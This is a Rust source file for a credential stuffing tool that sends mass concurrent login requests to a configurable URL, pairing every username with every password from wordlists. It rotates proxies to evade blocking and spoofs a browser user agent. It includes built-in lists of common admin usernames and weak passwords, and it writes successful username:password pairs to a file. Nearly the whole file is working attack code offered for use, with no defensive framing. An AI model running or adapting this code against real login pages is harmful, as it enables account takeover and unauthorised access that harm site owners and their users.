//! Credential stuffing module
//! Mass login attempts using username/password wordlists.
//! Supports proxy rotation, rate limiting, and result logging.

use reqwest::Client;
use std::sync::Arc;
use tokio::sync::Mutex;
use tokio::time::Duration;
use rand::seq::SliceRandom;
use crate::utils::{throttle, SharedRateLimiter, build_http_client, load_proxy_list};

/// Result of a credential stuffing attempt
#[derive(Debug, Clone)]
pub struct LoginResult {
    pub username: String,
    pub password: String,
    pub success: bool,
    pub response_code: u16,
    pub response_body_snippet: String,
}

/// Credential stuffing configuration
pub struct CredStuffConfig {
    pub login_url: String,
    pub username_field: String,
    pub password_field: String,
    pub extra_fields: Vec<(String, String)>,
    pub success_indicator: Option<String>,  // text or status code
    pub failure_indicator: Option<String>,
    pub threads: usize,
    pub proxy_list: Option<Vec<String>>,
    pub rate_limit_rps: u32,
    pub timeout_secs: u64,
    pub user_agent: String,
}

impl Default for CredStuffConfig {
    fn default() -> Self {
        Self {
            login_url: String::new(),
            username_field: "username".to_string(),
            password_field: "password".to_string(),
            extra_fields: Vec::new(),
            success_indicator: Some("dashboard".to_string()),
            failure_indicator: Some("invalid".to_string()),
            threads: 10,
            proxy_list: None,
            rate_limit_rps: 5,
            timeout_secs: 10,
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".to_string(),
        }
    }
}

/// Perform credential stuffing with given wordlists
pub async fn credential_stuffing(
    config: &CredStuffConfig,
    usernames: Vec<String>,
    passwords: Vec<String>,
    progress_callback: Option<Box<dyn Fn(usize, usize) + Send>>,
) -> Vec<LoginResult> {
    let total_attempts = usernames.len() * passwords.len();
    let results = Arc::new(Mutex::new(Vec::new()));
    let semaphore = Arc::new(tokio::sync::Semaphore::new(config.threads));
    let limiter = crate::utils::create_rate_limiter(config.rate_limit_rps);
    let mut tasks = vec![];

    // Proxy rotation
    let proxy_list = config.proxy_list.clone();
    let proxies = Arc::new(Mutex::new(proxy_list.unwrap_or_default()));
    
    let mut attempt_count = 0;

    for username in &usernames {
        for password in &passwords {
            let permit = semaphore.clone().acquire_owned().await.unwrap();
            let lim = limiter.clone();
            let res = results.clone();
            let u = username.clone();
            let p = password.clone();
            let cfg = config.clone();
            let proxies_clone = proxies.clone();
            
            tasks.push(tokio::spawn(async move {
                let _permit = permit;
                throttle(&lim).await;
                
                // Get proxy if available
                let proxy_opt = {
                    let mut prox = proxies_clone.lock().await;
                    prox.choose(&mut rand::thread_rng()).cloned()
                };
                
                let client = build_http_client(proxy_opt.as_deref(), cfg.timeout_secs, &cfg.user_agent);
                
                let mut params = vec![
                    (cfg.username_field.clone(), u.clone()),
                    (cfg.password_field.clone(), p.clone()),
                ];
                params.extend(cfg.extra_fields.clone());
                
                let response: Result<reqwest::Response, reqwest::Error> = client.post(&cfg.login_url)
                    .form(&params)
                    .send()
                    .await;
                
                let mut result = LoginResult {
                    username: u,
                    password: p,
                    success: false,
                    response_code: 0,
                    response_body_snippet: String::new(),
                };
                
                if let Ok(resp) = response {
                    result.response_code = resp.status().as_u16();
                    if let Ok(body) = resp.text().await {
                        result.response_body_snippet = body.chars().take(200).collect::<String>();
                        if let Some(success_text) = &cfg.success_indicator {
                            if body.to_lowercase().contains(&success_text.to_lowercase()) {
                                result.success = true;
                            }
                        }
                        if let Some(fail_text) = &cfg.failure_indicator {
                            if body.to_lowercase().contains(&fail_text.to_lowercase()) {
                                result.success = false;
                            }
                        }
                    }
                }
                
                let mut guard = res.lock().await;
                guard.push(result);
            }));
            attempt_count += 1;
            if let Some(cb) = &progress_callback {
                cb(attempt_count, total_attempts);
            }
        }
    }
    
    futures::future::join_all(tasks).await;
    let final_results = results.lock().await.clone();
    final_results
}

/// Load wordlist from file (one per line)
pub fn load_wordlist_from_file(path: &str) -> Vec<String> {
    std::fs::read_to_string(path)
        .unwrap_or_default()
        .lines()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect()
}

/// Generate default username list (common admin/root variants)
pub fn default_usernames() -> Vec<String> {
    vec![
        "admin".to_string(),
        "root".to_string(),
        "user".to_string(),
        "test".to_string(),
        "guest".to_string(),
        "administrator".to_string(),
        "webmaster".to_string(),
        "support".to_string(),
        "info".to_string(),
        "sales".to_string(),
    ]
}

/// Generate default password list (common weak passwords)
pub fn default_passwords() -> Vec<String> {
    vec![
        "password".to_string(),
        "123456".to_string(),
        "12345678".to_string(),
        "admin".to_string(),
        "root".to_string(),
        "qwerty".to_string(),
        "abc123".to_string(),
        "password123".to_string(),
        "admin123".to_string(),
        "letmein".to_string(),
        "welcome".to_string(),
        "monkey".to_string(),
        "dragon".to_string(),
        "master".to_string(),
        "login".to_string(),
    ]
}

/// Save successful logins to a file
pub fn save_successful_logins(results: &[LoginResult], output_path: &str) -> Result<(), std::io::Error> {
    let successful: Vec<&LoginResult> = results.iter().filter(|r| r.success).collect();
    let mut content = String::new();
    for res in successful {
        content.push_str(&format!("{}:{}\n", res.username, res.password));
    }
    std::fs::write(output_path, content)
}

/// Print summary of credential stuffing results
pub fn print_summary(results: &[LoginResult]) {
    let total = results.len();
    let successful = results.iter().filter(|r| r.success).count();
    let failed = total - successful;
    println!("=== Credential Stuffing Summary ===");
    println!("Total attempts: {}", total);
    println!("Successful: {} ({}%)", successful, (successful as f32 / total as f32) * 100.0);
    println!("Failed: {}", failed);
    println!("Successful credentials:");
    for res in results.iter().filter(|r| r.success) {
        println!("  {}:{} (HTTP {})", res.username, res.password, res.response_code);
    }
}